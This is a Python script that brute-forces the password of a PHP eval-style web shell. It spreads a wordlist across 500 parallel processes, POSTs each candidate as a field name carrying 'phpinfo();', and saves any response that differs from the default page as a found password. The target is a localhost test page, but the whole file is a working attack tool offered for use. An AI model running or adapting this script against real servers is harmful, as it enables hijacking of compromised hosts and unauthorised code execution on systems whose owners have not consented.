from concurrent.futures import process
import socket, os, requests, math, datetime
from urllib import response
import time
import multiprocessing as mp
from random import randint



#Place wordlist here
#--------------------------------------------------------------------------------------------------------------------------------------------------
word_list_file = open('wordlist.txt', 'r')
words = word_list_file.readlines()
word_list_file.close()

#Request speed is process num
#--------------------------------------------------------------------------------------------------------------------------------------------------
processes_num = 500

#Get info on wordlist
#todo: redo with lambdas, also write one that removes newlines
line_count = 0
for word in words:
    if word != "\n":
        line_count += 1
print("File lines: " + str(line_count))

proc_words = []
for word in words:
    if word != "\n":
        proc_words.append(word.strip())

words = proc_words

#Split into equal lengths for each process
k, m = divmod(len(words), processes_num)
lists = list(words[i*k+min(i, m):(i+1)*k+min(i+1, m)] for i in range(processes_num))


#place target here
#--------------------------------------------------------------------------------------------------------------------------------------------------
url = "http://127.0.0.1:8888/testphppage.php"
post_field_value = 'phpinfo();'
#comparison response is the default page, will not work if there is a clock for example on the webpage
comparison_response = (requests.post(url)).content
print(comparison_response)

def brute_force(post_field_value, comparison_response, url, passwords, count_queue):
        for password in passwords:
            try:
                count_queue.put(int(1))
                data = {password.strip(): post_field_value}
                response = (requests.post(url, data)).content
                
                if response != comparison_response and response != None:  
                    print("Possible password found: " + password)                    
                    with open("password.txt", 'w') as outfile:
                        outfile.write(password)
                    outfile.close()
                    if len(response) > 5:
                        with open("password_response.html", 'w') as outfile:
                            outfile.write(str(response))
                        outfile.close()

            except:
                #Included newline to avoid concurrency issues for multiple errors
                print("Error detected on password: " + password + ", waiting and resending\n")
                time.sleep(randint(15,30))
                response = (requests.post(url, data)).content
                if response != comparison_response and response != None:  
                    print("Possible password found: " + password)
                    print(response)
                    with open("password.txt", 'w') as outfile:
                        outfile.write(password)
                    outfile.close()
                    if len(response) > 5:
                        with open("password_response.html", 'w') as outfile:
                            outfile.write(str(response))
                        outfile.close()

#Sets up queue for the iterator, for percentage completion
m = mp.Manager()
count_queue = m.Queue()

#Starts workers
processes = []
for i in range(processes_num):
    p = mp.Process(target=brute_force, \
        args=[post_field_value, comparison_response, url, lists[i], count_queue])
    p.start()
    processes.append(p)

#Prints completion percentages using a shared queue between processes
count = 0 
completion_percentage_whole = 0
completion_percentage_float = 0
print("Completion: 0%")
while True:
    count += count_queue.get()
    completion_percentage_float = (count / line_count) * 100 
    if(math.floor(completion_percentage_float) >= completion_percentage_whole + 1):
        completion_percentage_whole = math.floor(completion_percentage_float)
        print("Completion: " + str(completion_percentage_whole) + "%")

